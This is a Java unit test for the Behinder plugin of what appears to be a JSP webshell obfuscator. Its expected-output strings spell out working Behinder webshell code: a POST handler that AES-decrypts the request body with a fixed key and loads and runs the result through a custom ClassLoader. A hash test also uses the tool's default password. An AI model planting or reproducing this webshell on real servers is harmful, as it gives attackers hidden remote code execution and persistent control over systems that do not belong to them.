package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContextAdapter;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class BehinderTest {

  @Test
  void getHashKey() {
      assertEquals("e45e329feb5d925b", new Behinder().getHashKey("rebeyond"));
  }

  @Test
  void testBehinder() {
      Behinder behinder = new Behinder();
      ExtensionContextAdapter ctx = new ExtensionContextAdapter();
      behinder.initExtension(ctx);
      ctx.setStringInput("key", "aaabbbccc");
      String expectedCode = """
if (request.getMethod().equals("POST")) {
  String k = "d1aaf4767a3c10a4";
  session.putValue("u", k);
  Cipher c = Cipher.getInstance("AES");
  c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
  new U(this.getClass().getClassLoader())
      .g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())))
      .newInstance()
      .equals(pageContext);
}""";
      List<String> code = behinder.getCode(ctx);
      assertEquals(1, code.size());
      assertEquals(expectedCode, code.get(0));
      String expectedDeclaration = """
class U extends ClassLoader {
  U(ClassLoader c) {
    super(c);
  }
  public Class g(byte[] b) {
    return super.defineClass(b, 0, b.length);
  }
}""";
      List<String> declaration = behinder.getDeclaration(ctx);
      assertEquals(1, declaration.size());
      assertEquals(expectedDeclaration, declaration.get(0));
      String expectedImport = """
java.util.*,javax.crypto.*,javax.crypto.spec.*""";
      List<String> imports = behinder.getImports(ctx);
      assertEquals(1, imports.size());
      assertEquals(expectedImport, imports.get(0));
  }
}
